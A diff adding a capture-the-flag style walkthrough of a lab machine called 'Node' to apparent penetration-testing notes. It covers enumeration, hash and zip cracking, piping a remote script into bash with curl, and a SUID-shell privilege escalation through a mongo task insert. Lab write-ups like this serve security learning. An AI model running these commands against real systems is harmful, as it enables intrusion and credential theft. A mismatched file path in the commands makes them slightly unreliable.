@@ -100,7 +100,52 @@ searchsploit -m php/webapps/43560.py
 ## 4. Node
 
 ### Approach Taken
+- run the nmap scan & access the web application
+- run gobuster
+- gobuster is not helpful moving on
+- with burp, spider the host & find out the app.js which will result in finding the required pages. we will navigate to each and every page.
+- we have /api/users which reveals some key user information.
+- we will have got hashes, try it out on hashes.com & find out the passwords. Try the admin account on the login page.
+- download the backup, base64 decode it & you will find a .zip file with password protection, you can use fcrackzip
+- You will have sourcecode for the application, search for 'password'
+- app.js has mongo credentials. Try to ssh with the same credentials. As soon as you get on the box, run the LinEnum.sh
+- always check for kernel exploits (priv escalation) & observe the processes run by tom, he is running scheduler.js script
+- using scheduler.js, escalate yourself to tom user & run LinEnum.sh again
+- search for SUID files
 
 ### Lessons Learned
+- Running gobuster through a proxy. In order to do that, go to burpsuite -> proxy -> options -> Add Proxy Listener (Binding: Specify Listen Port (8081), Request handling: Redirect to host: 10.10.10.58;Redirect to port: 3000)
+- There may be filtering in place for requests in order to prevent gobuster from doing enumeration, this can be identified by a difference in user-agent header. You can infact change the header with a flag
+- [hashes.org](https://hashes.org) is a useful for cracking hashes
 
 ### Commands Used
+```
+nmap -T5 -n -vvv -oA nmap/initial_no_scripts 10.10.10.58
+
+nmap -sC -sV -p22,3000 -oA nmap/initial 10.10.10.58
+
+nmap -p- -n -vvv -oA nmap/allports 10.10.10.58
+
+gobuster -u http://10.10.10.58:3000 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+# gobuster through burp proxy
+gobuster -u http://127.0.0.1:8081 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+gobuster -u http://127.0.0.1:8081 -a 'Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0' -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt
+
+sed 's/,/\n/g' api/users/<file>
+
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt backup.zip
+
+curl http://10.10.14.25:8000/LinEnum.sh | bash
+
+mongo -p -u mark scheduler
+
+db.tasks.insert({"cmd": "cp /bin/dash /tmp/bluejay; chmod u+s /tmp/bluejay;" })
+
+db.tasks.find()
+
+/tmp/bluejay820 -p
+
+find / -perm -4000 2>/dev/null
+```
